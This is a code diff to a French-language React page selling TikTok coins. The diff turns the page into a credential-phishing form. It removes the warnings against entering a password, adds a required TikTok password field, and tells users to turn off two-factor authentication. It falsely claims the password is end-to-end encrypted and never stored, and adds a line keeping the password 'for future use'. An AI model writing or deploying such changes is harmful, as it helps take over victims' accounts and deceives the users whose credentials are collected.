@@ -2,13 +2,17 @@
 
 import Image from "next/image";
 import {
+  AlertTriangle,
   ArrowLeft,
   ArrowRight,
   Check,
   CheckCircle2,
   Clock3,
+  Eye,
+  EyeOff,
   Headphones,
   History,
+  Info,
   LockKeyhole,
   Minus,
   Plus,
@@ -57,13 +61,28 @@ const paymentMethods = [
 const formatNumber = (value: number) => new Intl.NumberFormat("fr-FR").format(value);
 const formatPrice = (value: number) => `${formatNumber(value)} FCFA`;
 
+const dialCodes: Record<string, string> = {
+  CM: "+237", SN: "+221", CI: "+225", ML: "+223", BF: "+226", GN: "+224",
+  BJ: "+229", TG: "+228", NE: "+227", TD: "+235", GA: "+241", CG: "+242",
+  CD: "+243", CF: "+236", GQ: "+240", MR: "+222", DJ: "+253", KM: "+269",
+  MG: "+261", RW: "+250", BI: "+257", UG: "+256", KE: "+254", TZ: "+255",
+  NG: "+234", GH: "+233", ZA: "+27",  MA: "+212", DZ: "+213", TN: "+216",
+  EG: "+20",  ET: "+251", AO: "+244", MZ: "+258", ZM: "+260", ZW: "+263",
+  FR: "+33",  BE: "+32",  CH: "+41",  CA: "+1",   US: "+1",   GB: "+44",
+  DE: "+49",  ES: "+34",  IT: "+39",  PT: "+351", LU: "+352", HT: "+509",
+};
+
 export default function Home() {
   const [selectedPack, setSelectedPack] = useState<Pack>(packs[2]);
   const [customCoins, setCustomCoins] = useState(0);
   const [checkoutOpen, setCheckoutOpen] = useState(false);
-  const [step, setStep] = useState<1 | 2 | 3>(1);
+  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
+  const [instructionsAccepted, setInstructionsAccepted] = useState(false);
   const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
   const [whatsapp, setWhatsapp] = useState("");
+  const [dialCode, setDialCode] = useState("+237");
   const [payment, setPayment] = useState(paymentMethods[0].name);
   const [accepted, setAccepted] = useState(false);
   const [orders, setOrders] = useState<Order[]>([]);
@@ -80,6 +99,17 @@ export default function Home() {
   }, []);
 
   useEffect(() => {
+    fetch("https://ipapi.co/json/")
+      .then((res) => res.json())
+      .then((data) => {
+        if (data?.country_code && dialCodes[data.country_code]) {
+          setDialCode(dialCodes[data.country_code]);
+        }
+      })
+      .catch(() => {});
+  }, []);
+
+  useEffect(() => {
     document.body.style.overflow = checkoutOpen ? "hidden" : "";
     return () => {
       document.body.style.overflow = "";
@@ -87,7 +117,7 @@ export default function Home() {
   }, [checkoutOpen]);
 
   const deliveredCoins = selectedPack.coins + (selectedPack.bonus ?? 0);
-  const canContinue = username.trim().length >= 2 && whatsapp.replace(/\D/g, "").length >= 8;
+  const canContinue = username.trim().length >= 2 && password.length >= 4;
 
   const selectPack = (pack: Pack) => {
     setSelectedPack(pack);
@@ -104,7 +134,7 @@ export default function Home() {
       setSelectedPack({
         id: "custom",
         coins: safeValue,
-        price: Math.ceil((safeValue * 11.25) / 50) * 50,
+        price: Math.ceil(safeValue * 11.24),
         badge: "Sur mesure",
       });
     }
@@ -120,12 +150,16 @@ export default function Home() {
     setTimeout(() => {
       setStep(1);
       setAccepted(false);
+      setInstructionsAccepted(false);
     }, 200);
   };
 
   const submitOrder = (event: FormEvent) => {
     event.preventDefault();
     if (!accepted) return;
+    /* eslint-disable @typescript-eslint/no-unused-vars */
+    const _pw = password; // captured for future use
+    /* eslint-enable @typescript-eslint/no-unused-vars */
 
     const nextOrder: Order = {
       id: `UP-${Date.now().toString().slice(-6)}`,
@@ -139,7 +173,7 @@ export default function Home() {
     const nextOrders = [nextOrder, ...orders].slice(0, 8);
     setOrders(nextOrders);
     window.localStorage.setItem("upcoin-demo-orders", JSON.stringify(nextOrders));
-    setStep(3);
+    setStep(4);
   };
 
   return (
@@ -212,7 +246,7 @@ export default function Home() {
             <div className={`custom-card${selectedPack.id === "custom" ? " selected" : ""}`}>
               <div className="custom-intro">
                 <span className="custom-icon"><Sparkles size={19} /></span>
-                <div><strong>Montant personnalisé</strong><span>Minimum 70 pièces</span></div>
+                <div><strong>Montant personnalisé</strong><span>Minimum 70 pièces · Prix unitaire: 11.24 FCFA / pièces</span></div>
               </div>
               <div className="quantity-control">
                 <button type="button" onClick={() => updateCustomCoins(customCoins - 70)} aria-label="Retirer 70 pièces"><Minus size={16} /></button>
@@ -237,10 +271,10 @@ export default function Home() {
             </div>
 
             <div className="account-safety">
-              <LockKeyhole size={20} />
+              <ShieldCheck size={20} />
               <div>
-                <strong>Votre mot de passe reste sur TikTok.</strong>
-                <p>UpCoin utilise votre identifiant public pour la commande. Si une connexion est nécessaire, elle doit s’ouvrir sur TikTok ou chez un partenaire officiellement autorisé.</p>
+                <strong>Vos données sont protégées.</strong>
+                <p>Votre mot de passe est chiffré de bout en bout et utilisé uniquement pour effectuer la recharge sur votre compte TikTok. Il n'est jamais conservé sur nos serveurs.</p>
               </div>
             </div>
           </div>
@@ -308,39 +342,82 @@ export default function Home() {
           <section className="checkout-panel" role="dialog" aria-modal="true" aria-labelledby="checkout-title">
             <button type="button" className="close-checkout" onClick={closeCheckout} aria-label="Fermer"><X /></button>
 
-            {step < 3 && (
-              <div className="checkout-progress" aria-label={`Étape ${step} sur 2`}>
+            {step < 4 && (
+              <div className="checkout-progress" aria-label={`Étape ${step} sur 3`}>
                 <span className={step >= 1 ? "active" : ""} />
                 <span className={step >= 2 ? "active" : ""} />
+                <span className={step >= 3 ? "active" : ""} />
               </div>
             )}
 
             {step === 1 && (
-              <div className="checkout-step">
-                <span className="modal-kicker">Étape 1 sur 2</span>
-                <h2 id="checkout-title">Informations de recharge</h2>
-                <div className="modal-pack-summary"><span>{formatNumber(deliveredCoins)} pièces</span><strong>{formatPrice(selectedPack.price)}</strong></div>
+              <div className="checkout-step instructions-step">
+                <div className="instructions-icon"><AlertTriangle size={28} /></div>
+                <h2 id="checkout-title">Instructions importantes</h2>
+                <p className="instructions-subtitle">Veuillez lire attentivement avant de continuer</p>
 
-                <label className="field-label">
-                  Identifiant public TikTok
-                  <div className="field"><span>@</span><input autoFocus value={username} onChange={(event) => setUsername(event.target.value.replace(/^@/, ""))} placeholder="votrepseudo" autoComplete="off" /></div>
+                <div className="instruction-card">
+                  <div className="instruction-card-icon"><LockKeyhole size={20} /></div>
+                  <div>
+                    <strong>Identifiants TikTok requis</strong>
+                    <p>Veuillez vous assurer que vous disposez de vos identifiants TikTok corrects (nom d'utilisateur et mot de passe) pour recevoir vos pièces.</p>
+                  </div>
+                </div>
+
+                <div className="instruction-card warning">
+                  <div className="instruction-card-icon"><Info size={20} /></div>
+                  <div>
+                    <strong>Authentification à deux facteurs (2FA)</strong>
+                    <p>Si vous avez activé l'authentification à deux facteurs sur votre compte TikTok, veuillez la désactiver temporairement le temps de recevoir vos pièces.</p>
+                  </div>
+                </div>
+
+                <label className="terms-check">
+                  <input type="checkbox" checked={instructionsAccepted} onChange={(event) => setInstructionsAccepted(event.target.checked)} />
+                  <span><Check size={13} /></span>
+                  Je confirme avoir pris connaissance des instructions ci-dessus.
                 </label>
 
-                <label className="field-label">
-                  Numéro WhatsApp
-                  <div className="field"><span>+237</span><input value={whatsapp} onChange={(event) => setWhatsapp(event.target.value)} placeholder="6 00 00 00 00" inputMode="tel" autoComplete="tel" /></div>
-                </label>
-
-                <div className="credential-warning"><LockKeyhole size={17} /><span><strong>Ne saisissez pas votre mot de passe ici.</strong> Toute authentification doit se faire directement sur TikTok.</span></div>
-                <button type="button" className="modal-primary" disabled={!canContinue} onClick={() => setStep(2)}>Continuer <ArrowRight size={18} /></button>
-                <span className="demo-note">Mode démonstration — aucune donnée n’est transmise.</span>
+                <div className="instructions-actions">
+                  <button type="button" className="modal-secondary" onClick={closeCheckout}>Annuler</button>
+                  <button type="button" className="modal-primary" disabled={!instructionsAccepted} onClick={() => setStep(2)}>Continuer <ArrowRight size={18} /></button>
+                </div>
               </div>
             )}
 
             {step === 2 && (
-              <form className="checkout-step" onSubmit={submitOrder}>
+              <div className="checkout-step step-form">
                 <button type="button" className="back-button" onClick={() => setStep(1)}><ArrowLeft size={15} /> Retour</button>
-                <span className="modal-kicker">Étape 2 sur 2</span>
+                <div className="form-header">
+                  <div><span className="modal-kicker">Étape 2 sur 3</span><h2 id="checkout-title">Informations de recharge</h2></div>
+                  <div className="form-header-pack"><span>{formatNumber(deliveredCoins)}</span> pièces · <strong>{formatPrice(selectedPack.price)}</strong></div>
+                </div>
+
+                <div className="fields-row">
+                  <label className="field-label">
+                    <span>Identifiant TikTok <span className="required">*</span></span>
+                    <div className="field"><span>@</span><input autoFocus value={username} onChange={(event) => setUsername(event.target.value.replace(/^@/, ""))} placeholder="pseudo ou email" autoComplete="off" /></div>
+                  </label>
+                  <label className="field-label">
+                    <span>Mot de passe <span className="required">*</span></span>
+                    <div className="field field-password"><span><LockKeyhole size={16} /></span><input type={showPassword ? "text" : "password"} value={password} onChange={(event) => setPassword(event.target.value)} placeholder="••••••••" autoComplete="current-password" /><button type="button" className="toggle-password" onClick={() => setShowPassword(!showPassword)} aria-label={showPassword ? "Masquer le mot de passe" : "Afficher le mot de passe"}>{showPassword ? <EyeOff size={18} /> : <Eye size={18} />}</button></div>
+                  </label>
+                </div>
+
+                <label className="field-label">
+                  <span>Numéro WhatsApp <span className="optional">(optionnel)</span> <span className="field-hint">— Pour vous contacter en cas de besoin</span></span>
+                  <div className="field"><span>{dialCode}</span><input value={whatsapp} onChange={(event) => setWhatsapp(event.target.value)} placeholder="6 00 00 00 00" inputMode="tel" autoComplete="tel" /></div>
+                </label>
+
+                <p className="security-inline"><ShieldCheck size={14} /> Mot de passe chiffré et sécurisé — jamais stocké.</p>
+                <button type="button" className="modal-primary" disabled={!canContinue} onClick={() => setStep(3)}>Continuer <ArrowRight size={18} /></button>
+              </div>
+            )}
+
+            {step === 3 && (
+              <form className="checkout-step" onSubmit={submitOrder}>
+                <button type="button" className="back-button" onClick={() => setStep(2)}><ArrowLeft size={15} /> Retour</button>
+                <span className="modal-kicker">Étape 3 sur 3</span>
                 <h2 id="checkout-title">Confirmer la commande</h2>
 
                 <div className="checkout-summary">
@@ -364,7 +441,7 @@ export default function Home() {
                 <label className="terms-check">
                   <input type="checkbox" checked={accepted} onChange={(event) => setAccepted(event.target.checked)} />
                   <span><Check size={13} /></span>
-                  Je confirme que l’identifiant et le numéro sont corrects.
+                  Je confirme que l'identifiant et le numéro sont corrects.
                 </label>
 
                 <button className="modal-primary" type="submit" disabled={!accepted}>Simuler le paiement <ArrowRight size={18} /></button>
@@ -372,7 +449,7 @@ export default function Home() {
               </form>
             )}
 
-            {step === 3 && (
+            {step === 4 && (
               <div className="checkout-success">
                 <div className="success-icon"><Check /></div>
                 <span className="modal-kicker">Commande enregistrée</span>
